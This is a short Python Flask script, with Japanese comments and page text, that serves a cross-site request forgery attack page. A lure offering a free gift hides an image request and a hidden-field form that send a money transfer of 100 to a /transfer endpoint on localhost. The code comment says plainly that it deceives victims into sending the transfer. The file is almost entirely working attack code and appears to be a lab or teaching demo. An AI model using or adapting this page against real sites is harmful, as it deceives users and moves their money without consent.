from flask import Flask

app = Flask(__name__)

@app.route("/")
def malicious():
    # 被害者を騙して送金リクエストを送らせる
    return '''
        <h1>無料ギフトを差し上げます！</h1>
        <img src="http://localhost/transfer" style="display:none;" alt=""/>
        <form action="http://localhost/transfer" method="POST">
            <input type="hidden" name="amount" value="100">
            <button type="submit">クリックしてギフトを受け取る</button>
        </form>
    '''

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10404, debug=True)